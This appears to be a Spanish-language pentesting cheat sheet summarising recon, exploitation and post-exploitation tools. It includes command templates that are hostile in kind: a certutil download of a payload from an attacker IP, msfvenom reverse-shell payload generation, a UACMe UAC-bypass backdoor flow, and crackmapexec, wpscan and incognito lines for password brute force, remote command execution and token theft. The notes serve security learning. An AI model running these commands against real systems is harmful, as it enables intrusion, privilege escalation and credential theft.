# Herramientas

### `cadaver`  
Cliente WebDAV de línea de comandos, similar a un cliente FTP para servidores WebDAV.  
- Permite **navegar, listar, subir, descargar, mover y borrar** archivos y directorios en un endpoint WebDAV.  
- Útil para interacción manual y verificación de permisos (lectura/escritura).  
- Soporta autenticación básica y digest; puede pedir credenciales al conectarse.  
- Comandos comunes dentro de la sesión `cadaver`: `ls`, `cd`, `pwd`, `put archivo`, `get archivo`, `delete archivo`, `mkdir`.  
- Ejemplo de conexión: `cadaver http://target.com/webdav/` (luego autenticar si es necesario).  
- Muy usado en pentesting para probar si un servidor permite **subida de archivos** o gestión remota de ficheros.

### `certutil`
Herramienta nativa de Windows para **gestionar certificados y realizar operaciones criptográficas**.  
- Qué hace: ver/instalar/exportar certificados, codificar/decodificar (Base64), calcular hashes y —entre otras opciones— descargar recursos remotos (`-urlcache`).  
- Casos de uso legítimos, administración de CAs y certificados, ver detalles de un `.cer`, verificar la integridad de archivos mediante hashes.  
- Riesgo/abuso: su funcionalidad de descarga y codificación se ha aprovechado en ataques *Living off the Land* para traer payloads sin usar binarios externos; por eso conviene monitorizar su uso.
- Limitaciones: requiere conectividad para descargar; sus operaciones quedan registradas y pueden ser inspeccionadas por EDR/proxy.
- Ejemplos: `certutil -urlcache -f http://<IP_atacante>/<ruta_payload> <nuevo_nombre>`, `certutil -hashfile <archivo> SHA256`, `certutil -dump <certificado.cer>`

### `crackmapexec`  
Framework de post-explotación y enumeración para entornos Windows (CME).  
- Herramienta en Python que permite **escanear y operar a gran escala** sobre protocolos Windows: SMB, WinRM, LDAP, MSSQL, etc.  
- Ideal para **paralelizar tareas** (mismas credenciales contra múltiples hosts) y ejecutar módulos o comprobaciones automatizadas.  
- Soporta autenticación con usuario/contraseña, hashes NTLM y autenticación de dominio (`-u`, `-p`, `-H`, `-d`).  
- Permite enumeración de recursos: `--shares`, `--users`, `--pass-pol`, `--local-auth`, entre otros.  
- Dispone de un sistema de **módulos** (`-M <module>`) para tareas comunes (dump de credenciales, persistencia, recolección de información).  
- Uso típico para lateral movement, enumeración masiva y ejecución de módulos en entornos Windows autorizados.  
- Ejemplos de comandos: `crackmapexec winrm <ip> -u <user> -p <wordlist passwords>`, `crackmapexec winrm <ip> -u <user> -p <password> -x "<command>"`

### `davtest`  
Herramienta de auditoría para **probar la capacidad de subida y ejecución** en servidores WebDAV.  
- Intenta subir archivos con múltiples extensiones (`.php`, `.asp`, `.jsp`, etc.) y luego verifica si son accesibles/executables.  
- Permite detectar configuraciones inseguras que permiten subir webshells o artefactos ejecutables.  
- Soporta parámetros de autenticación para targets protegidos (`-auth user:pass`).  
- Uso típico: `davtest -url http://target.com/webdav/` y opciones adicionales para extensiones o rutas.  
- Muy útil en etapas de explotación de aplicaciones web basadas en WebDAV.

### `dig`  
Herramienta de línea de comandos para realizar consultas DNS.  
- Permite consultar registros como **A, AAAA, MX, NS, TXT, SOA, CNAME**.  
- Soporta consultas a **servidores DNS específicos** con `@servidor`.  
- Puede mostrar resultados en formato resumido (`+short`) o detallado.  
- Permite medir tiempos de respuesta y depurar problemas de DNS.  
- También se usa para probar **transferencias de zona (AXFR)** y detectar configuraciones inseguras.  

### `dirb`  
Herramienta para **fuerza bruta de directorios y archivos web**.  
- Busca rutas ocultas en servidores web usando **wordlists**.  
- Permite probar varias extensiones de archivos (`-X .php,.bak,.zip`) para encontrar backups o scripts.  
- Útil para detectar **directorios no indexados** o archivos sensibles.  
- Soporta escaneo recursivo para descubrir rutas profundas.  
- Ideal para enumeración de contenido en pruebas de penetración web.  

### `dnsdumpster.com`  
Servicio en línea para **reconocimiento DNS** de un dominio.  
- Identifica registros (A, MX, NS, TXT).  
- Descubre **subdominios** y hosts relacionados.  
- Genera posibles **mapas de red** visuales.  
- Ayuda en la enumeración inicial de infraestructura de un objetivo.  

### `dnsenum`  
Herramienta en Perl para **enumeración DNS** automatizada.  
- Obtiene registros DNS (A, MX, NS, TXT).  
- Intenta realizar **transferencias de zona (AXFR)**.  
- Usa diccionarios para descubrir **subdominios ocultos**.  
- Puede buscar rangos de IP relacionados con el dominio.  
- Integra búsquedas inversas para encontrar hosts asociados.  

### `dnsrecon`  
Herramienta avanzada de **reconocimiento DNS** en Python.  
- Enumera registros comunes y especiales (A, AAAA, MX, SOA, PTR, TXT).  
- Realiza **zonetransfer tests (AXFR)** para encontrar fugas de datos.  
- Permite **fuerza bruta de subdominios** con diccionarios.  
- Realiza consultas inversas para identificar hosts por IP.  
- Exporta resultados en múltiples formatos (CSV, JSON, XML).  

### `evil-winrm`  
Cliente de WinRM para **obtener shells remotos** en máquinas Windows (PowerShell interactivo).  
- Proporciona un prompt de PowerShell contra el servicio **WinRM** usando credenciales válidas o hashes NTLM.  
- Permite **subida/descarga de archivos**, ejecución de comandos, y ejecución de scripts PowerShell localmente.  
- Soporta autenticación por contraseña, hash NTLM (`-H`), Kerberos (con configuración adicional) y SSL (`-S`).  
- Opciones habituales: `-i` IP/host, `-u` usuario, `-p` contraseña, `-H` hash NTLM, `-P` puerto, `-s` ruta de scripts locales, `-l` para log.  
- Muy usado en fases de post-explotación y lateral movement cuando WinRM está habilitado en la red objetivo.  
- Ejemplos de uso: `evil-winrm -u <user> -p <password> -i <ip>`

### `fierce`  
Herramienta en Perl enfocada en **descubrir hosts y subdominios**.  
- Localiza subdominios mediante **wordlists**.  
- Detecta configuraciones incorrectas de DNS (AXFR).  
- Busca **rangos de IP asociados** a un dominio.  
- Intenta localizar hosts internos expuestos.  
- Muy usada en la fase de **reconocimiento pasivo y activo** en pentesting.  

### `fping`
Herramienta rápida para **sondear múltiples hosts mediante ICMP Echo (ping)** — ideal para descubrimiento masivo.  
- Envía pings **en paralelo** a muchos hosts (más rápido que `ping` uno a uno).  
- Soporta sondas por **host único, lista, rango y redes (CIDR)**: `fping 192.168.1.1`, `fping -g 192.168.1.0/24`, `fping -f hosts.txt`.
- Ideal para **descubrimiento por redes o listas grandes** en auditorías internas; salida fácil de parsear para scripts.  
- Limitaciones: depende de **ICMP** (firewalls pueden bloquearlo); no reemplaza escaneo de puertos (`nmap`).  

### `httrack`  
Herramienta para **descargar o hacer mirror de sitios web**.  
- Crea una copia local completa de un sitio accesible públicamente.  
- Descarga páginas HTML, imágenes, scripts y archivos referenciados.  
- Permite inspeccionar archivos **no visibles en la navegación normal**.  
- Útil para análisis offline o descubrimiento de archivos ocultos.  
- Puede ser configurada para seguir enlaces recursivamente y respetar reglas de robots.txt. 

### `incognito`  
Plugin de Meterpreter para listar, robar e impersonar *access tokens* en Windows.  
- Comandos principales: `load incognito`, `list_tokens -u`, `steal_token <proc|user>`, `impersonate_token <token>`, `revert_to_self`.  
- Permite ejecutar acciones con los permisos de otro usuario sin contraseña (útil para escalar privilegios).  
- Limitaciones: requiere tokens accesibles en memoria y permisos (p. ej. `SeDebugPrivilege`); puede ser detectado por EDR.

### `msfvenom`
Herramienta de Metasploit para **generar payloads** en múltiples formatos (PE, DLL, scripts, etc.) usada en pruebas de penetración en entornos controlados.  
- Combina un payload (identificador) con parámetros (LHOST/LPORT, encoder, formato) y produce un artefacto que, si se ejecuta en un host objetivo, realiza la acción programada por ese payload (en laboratorio: abrir una sesión reversa, bind shell, etc.).  
- Estructura de payload identifiers: `<platform>[/<arch>]/<family>[/<transport>]` (ej.: `windows/meterpreter/reverse_tcp`, `windows/x64/meterpreter/reverse_tcp`).  
- Tipos / variantes: meterpreter (post-explotación avanzada), shells básicos (cmd), transportes (reverse_tcp, reverse_https), staged vs stageless; formatos de salida: `exe`, `dll`, `ps1`, `raw`, `elf`, etc.  
- Ética y seguridad: **solo** usar en VMs/labs autorizados; compartir artifacts o utilizarlos fuera de ese scope puede ser ilegal.
- Ejemplos: `msfvenom -p <meterpreter> LHOST=<ip_atacante> LPORT=<puerto> -f <extensión> > <nombre_archivo>`

### `netcraft.com`  
Servicio en línea de **reconocimiento de infraestructura web**.  
- Identifica el **sistema operativo** del servidor.  
- Detecta **tecnologías** usadas (CMS, frameworks, servidores).  
- Obtiene datos de **hosting y proveedor de servicios**.  
- Muestra información sobre **certificados SSL/TLS**.  
- Puede dar detalles históricos del dominio (tecnologías pasadas, hosting previo).  

### `netdiscover`  
Herramienta de descubrimiento de red basada en ARP.  
- Detecta **hosts activos en la red local** sin necesidad de ping.  
- Útil en redes donde el **ICMP está bloqueado**.  
- Permite identificar **direcciones IP, MAC y fabricantes** de los dispositivos.  
- Puede ejecutarse en modo pasivo (escucha ARP) o activo (envía ARP requests).  
- Ideal para auditorías rápidas de redes WiFi o LAN.  

### `nmap`  
Herramienta avanzada de **escaneo de red y seguridad**.  
- Permite descubrir **hosts activos** en un rango de IP.  
- Detecta **puertos abiertos, servicios y versiones** en ejecución.  
- Puede identificar el **sistema operativo y tipo de dispositivo**.  
- Incluye scripts (NSE – Nmap Scripting Engine) para **detección de vulnerabilidades**.  
- Soporta múltiples tipos de escaneo: TCP SYN, UDP, ICMP, entre otros.  
- La opción `-Pn` **omite el ping inicial** y fuerza el escaneo de puertos incluso si el host no responde a ICMP (útil en Windows o redes que bloquean ping).  

### `sublist3r`  
Herramienta en Python para **enumerar subdominios**.  
- Usa motores de búsqueda (Google, Bing, Yahoo, Baidu, Ask).  
- Integra fuentes públicas como VirusTotal y Netcraft.  
- Puede trabajar con wordlists para fuerza bruta.  
- Resultados exportables en archivos de texto.  
- Ideal para descubrir subdominios rápidamente usando **OSINT**.  

### `theHarvester`  
Herramienta de recolección de información mediante **OSINT**.  
- Obtiene **correos electrónicos** relacionados con el dominio.  
- Extrae nombres de empleados desde fuentes públicas.  
- Descubre subdominios, hosts y puertos abiertos.  
- Se integra con buscadores, PGP servers, y redes sociales.  
- Muy útil en la fase de **footprinting** de un objetivo.  

### `UACMe`  
Colección de PoCs/métodos para bypass de UAC (educativo).  
- Contiene métodos numerados (p. ej. `23`) que explotan DLL hijack, COM, IFileOperation, etc., para ejecutar payloads en integridad alta.  
- Flujo típico: generar `backdoor.exe` (`msfvenom`), subir `Akagi64.exe` + `backdoor.exe`, ejecutar `Akagi64.exe <método> <ruta_backdoor>`.  
- Resultado: si funciona, el payload se ejecuta elevado (o se obtiene token elevado) y el handler recibe una sesión con mayores privilegios.  
- Advertencia: solo en entornos autorizados; puede causar inestabilidad y desencadenar detecciones de seguridad.

### `wafw00f`  
Herramienta para detectar **Web Application Firewalls (WAF)**.  
- Identifica si un sitio web tiene un WAF activo.  
- Reconoce el **tipo y fabricante** del WAF (Cloudflare, F5, Akamai, etc.).  
- Permite ajustar ataques posteriores según el firewall encontrado.  
- Útil para planear pruebas de penetración web más efectivas.  

### `whatis`  
Herramienta de Linux para **documentación rápida de comandos**.  
- Muestra una breve descripción de un comando.  
- Sirve como acceso rápido al **manual del sistema**.  
- Ejemplo: `whatis ls` devuelve “ls (1) - list directory contents”.  

### `whois`  
Herramienta que consulta la base de datos de registros de dominios.  
- Obtiene información sobre el **propietario** de un dominio.  
- Muestra **fechas de creación y expiración**.  
- Indica servidores DNS asociados y hosting.  
- Puede revelar datos de contacto (si no están ocultos con privacidad).  
- También sirve para investigar **rangos de IP** y ASN.  

### `wpscan`  
Herramienta especializada para **auditorías de seguridad en sitios WordPress**.  
- Detecta versión del core, **enumera temas y plugins** y comprueba si existen vulnerabilidades conocidas consultando la WPScan Vulnerability Database.  
- Soporta **enumeración de usuarios**, fingerprinting, fuerza bruta contra el formulario de login y exportación de reportes.  
- Para obtener la información de vulnerabilidades necesita un **API token** (registro en wpscan.com); sin token el escaneo funciona pero no mostrará detalles CVE/DB.
- Soporta comprobaciones de login por fuerza bruta con wordlists; **usar solo contra objetivos autorizados**.  
- Ejemplo de comandos: `wpscan --url <url> --usernames <user> --passwords <WORDLIST>`, `wpscan --url <url> -e u`

### `xfreerdp3`  
Cliente RDP (Remote Desktop Protocol) de la suite **FreeRDP** (binario `xfreerdp` v3.x).  
- Conecta a escritorios/servidores Windows vía **RDP** (puerto por defecto 3389).  
- Soporta **autenticación** (usuario/contraseña, dominio, NLA) y modos de seguridad (`/sec:nla|tls|rdp`).  
- Permite **redirigir recursos locales**: unidades (`/drive:NAME,PATH`), portapapeles (`/clipboard`), impresoras, sonido y micrófono. 
- Utilidad en pentesting autorizado: comprobar credenciales (`/auth-only`), probar redirecciones y verificar configuración de certificados (`/cert-ignore`, `/cert-tofu`).  
- Parámetros útiles: `/v:<host[:port]>`, `/u:`, `/p:`, `/d:`, `/log-level:TRACE|DEBUG|INFO|WARN|ERROR`.

